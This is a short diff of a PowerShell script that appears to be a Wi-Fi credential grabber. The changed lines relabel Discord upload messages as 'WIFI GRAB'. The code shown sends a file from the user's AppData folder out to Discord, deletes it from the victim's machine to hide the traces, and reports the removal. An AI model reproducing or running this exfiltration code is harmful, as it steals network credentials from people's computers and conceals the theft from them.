@@ -92,7 +92,7 @@ Upload-Discord -text "filesaved"
 Start-Sleep -Seconds 2
 
 #File Sent
-Upload-Discord -text "File Uploaded" -file $Env:USERPROFILE\AppData\Local\test1.txt
+Upload-Discord -text " ```WIFI GRAB``` " -file $Env:USERPROFILE\AppData\Local\test1.txt
 
 # Delay the script for 2 seconds
 Start-Sleep -Seconds 2
@@ -101,5 +101,5 @@ Start-Sleep -Seconds 2
 #File Delete
 
 Remove-Item -LiteralPath $Env:USERPROFILE\AppData\Local\test1.txt
-Upload-Discord -text "Item removed from client"
+Upload-Discord -text " ***File removed from Client*** "
 #-----------------------------------------------------------------------------------------------------------------------------------------------------------
